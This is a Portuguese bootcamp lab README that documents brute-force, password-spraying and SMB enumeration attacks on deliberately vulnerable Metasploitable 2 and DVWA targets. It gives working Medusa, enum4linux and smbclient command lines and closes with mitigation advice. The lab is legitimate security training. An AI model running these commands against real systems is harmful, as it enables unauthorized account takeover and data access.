# bootcamp-riachuelo-cybersecurity-lab
Simulação de ataques de força bruta e análise de vulnerabilidades em serviços FTP, SMB e Web (DVWA) utilizando Kali Linux, Medusa e Burp Suite. Projeto prático do Bootcamp Riachuelo/DIO.

## Projeto: Simulação de Ataques de Força Bruta e Análise de Vulnerabilidades

Este repositório contém a documentação e os resultados do desafio prático de implementação de ataques de força bruta em ambientes controlados. O objetivo principal foi validar vulnerabilidades em serviços críticos e propor medidas de mitigação baseadas em frameworks de segurança.

## 🚀 Objetivo do Desafio
Implementar um laboratório de testes de intrusão para simular cenários reais de ataques de força bruta, utilizando ferramentas de auditoria e automação para comprometer serviços de rede e aplicações web.

## 🛠️ Tecnologias e Ferramentas Utilizadas
* **Sistema Operacional:** Kali Linux (Atacante) e Metasploitable 2 (Alvo).
* **Rede:** Configuração Host-Only via VirtualBox.
* **Ferramentas:** * `Medusa`: Automação de ataques de força bruta (FTP, SMB e HTTP).
    * `Burp Suite`: Interceptação e análise de tráfego web.
    * `enum4linux`: Enumeração de usuários e compartilhamentos SMB.
    * `smbclient`: Exploração de diretórios e arquivos em rede.

## 💻 Cenários de Teste

### 1. Força Bruta em FTP (Porta 21)
Execução de ataque de dicionário utilizando o módulo FTP do Medusa para obter acesso administrativo.

      medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp

### 2. Password Spraying e Exploração de SMB (Porta 445)
Neste cenário, utilizou-se a técnica de Password Spraying para testar uma única senha contra uma lista de usuários, visando evitar a detecção por sistemas de proteção.

* **Enumeração de Usuários:**
      enum4linux -U 192.168.56.102

* **Ataque com Medusa:**
      medusa -h 192.168.56.102 -U users.txt -p msfadmin -M smbnt

* **Pós-Exploração:** Com as credenciais obtidas, foi possível navegar pelos diretórios compartilhados.
      smbclient //192.168.56.102/msfadmin -U msfadmin

* **Constatação:** Identificou-se uma falha de Broken Access Control, onde o usuário possui permissões excessivas em diretórios sensíveis.

### 3. Automação de Formulário Web (DVWA)

* **BurpSuite:** Utilização do Burp Suite para realizar o reconhecimento da aplicação e identificar a "assinatura de erro" necessária para a automação.

* **Reconhecimento:** Através do Repeater, identificou-se que a mensagem de falha é "Username and/or password incorrect.".

* **Ataque Automatizado:**
   
   medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m FORM:"dvwa/vulnerabilities/brute/index.php?username=^USER^&password=^PASS^&Login=Login":"Username     and/or password incorrect."

### 🛡️ Medidas de Mitigação Recomendadas

* **Políticas de Senhas:** Implementar requisitos de complexidade, tamanho mínimo e rotação periódica de credenciais.

* **MFA (Multi-Factor Authentication):** Camada de segurança essencial para neutralizar ataques de credenciais, mesmo que a senha primária seja comprometida.

* **Hardening de Protocolos:** Substituir o FTP por versões cifradas como SFTP ou FTPS.

* **Desativar o protocolo SMBv1 e exigir SMB Signing.**

* **Proteção Web:** Implementar Rate Limiting para bloquear IPs após sucessivas falhas e utilizar WAF (Web Application Firewall) para detectar padrões de automação.

📝 Conclusão
      O laboratório demonstrou que a segurança baseada apenas em perímetros de rede é insuficiente se os serviços internos possuírem configurações frágeis. O uso        de ferramentas como Medusa e Burp Suite permitiu mapear riscos que, em um ambiente real, poderiam levar ao vazamento de dados críticos. A prática reforçou a       necessidade de uma defesa em profundidade e monitoramento contínuo de logs de autenticação.

                     **Desenvolvido como parte do currículo de Cibersegurança da DIO em parceria com a Riachuelo.**
